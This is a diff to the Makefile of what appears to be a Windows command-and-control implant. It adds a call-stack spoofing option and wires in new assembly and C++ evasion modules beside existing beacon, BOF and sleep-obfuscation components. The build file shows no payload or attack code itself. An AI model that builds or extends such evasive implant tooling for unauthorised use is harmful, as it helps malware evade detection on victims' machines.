@@ -16,6 +16,7 @@ PAIN_C2_SSL  ?= 0
 PAIN_AUTH_MODE   ?= 0
 PAIN_AUTH_KEY    ?= 00000000000000000000000000000000
 PAIN_SLEEP_TECH  ?= 0
+PAIN_STACK_SPOOF ?= 1
 # UUID is now generated at agent runtime - no compile-time value needed
 
 # Complier Flags - Cross-compile for windows
@@ -36,7 +37,8 @@ CXXFLAGS = -target x86_64-w64-mingw32 \
 		   -DPAIN_C2_SSL=$(PAIN_C2_SSL) \
 		   -DPAIN_AUTH_MODE=$(PAIN_AUTH_MODE) \
 		   -DPAIN_AUTH_KEY=\"$(PAIN_AUTH_KEY)\" \
-		   -DPAIN_SLEEP_TECH=$(PAIN_SLEEP_TECH)
+		   -DPAIN_SLEEP_TECH=$(PAIN_SLEEP_TECH) \
+		   -DPAIN_STACK_SPOOF=$(PAIN_STACK_SPOOF)
 
 
 # Output file as a PE COFF object file
@@ -49,7 +51,8 @@ ASFLAGS	= -f win64
 LDFLAGS	= -T scripts/Linker.ld --no-undefined -s --image-base 0x0
 
 # All c++ Object files - add a new line here for every new .cc file
-ASM_OBJ = $(OBJ_DIR)/Entry.x64.o
+ASM_OBJ = $(OBJ_DIR)/Entry.x64.o \
+		  $(OBJ_DIR)/Spoof.x64.o
 CXX_OBJ = $(OBJ_DIR)/LdrLoad.o \
 		  $(OBJ_DIR)/Main.o		\
 		  $(OBJ_DIR)/Agent.o	\
@@ -64,9 +67,11 @@ CXX_OBJ = $(OBJ_DIR)/LdrLoad.o \
 		  $(OBJ_DIR)/Tasks.o      \
 		  $(OBJ_DIR)/Beacon.o      \
 		  $(OBJ_DIR)/TimerSpoof.o  \
+		  $(OBJ_DIR)/EkkoGraft.o   \
 		  $(OBJ_DIR)/Ekko.o        \
 		  $(OBJ_DIR)/Bof.o        \
 		  $(OBJ_DIR)/BeaconApi.o  \
+		  $(OBJ_DIR)/Frame.o      \
 
 all : dirs $(TARGET)
 
@@ -75,6 +80,10 @@ dirs:
 
 # Compiler rules - one per source file
 $(OBJ_DIR)/Entry.x64.o: Asm/Entry.x64.asm
+	@echo "[ASM]  $<"
+	@$(AS) $(ASFLAGS) $< -o $@
+
+$(OBJ_DIR)/Spoof.x64.o: Asm/Spoof.x64.asm
 	@echo "[ASM]  $<"
 	@$(AS) $(ASFLAGS) $< -o $@
 
@@ -134,6 +143,10 @@ $(OBJ_DIR)/TimerSpoof.o: Source/Evasion/Sleep/TimerSpoof.cc
 	@echo "[CXX] $<"
 	@$(CXX) $(CXXFLAGS) -c $< -o $@
 
+$(OBJ_DIR)/EkkoGraft.o: Source/Evasion/Sleep/EkkoGraft.cc
+	@echo "[CXX] $<"
+	@$(CXX) $(CXXFLAGS) -c $< -o $@
+
 $(OBJ_DIR)/Ekko.o: Source/Evasion/Sleep/Ekko.cc
 	@echo "[CXX] $<"
 	@$(CXX) $(CXXFLAGS) -c $< -o $@
@@ -144,6 +157,10 @@ $(OBJ_DIR)/Bof.o: Source/Misc/Bof.cc
 
 $(OBJ_DIR)/BeaconApi.o: Source/Misc/BeaconApi.cc
 	@echo "[CXX] $<"
+	@$(CXX) $(CXXFLAGS) -c $< -o $@
+
+$(OBJ_DIR)/Frame.o: Source/Evasion/Spoof/Frame.cc
+	@echo "[CXX]  $<"
 	@$(CXX) $(CXXFLAGS) -c $< -o $@
 
 
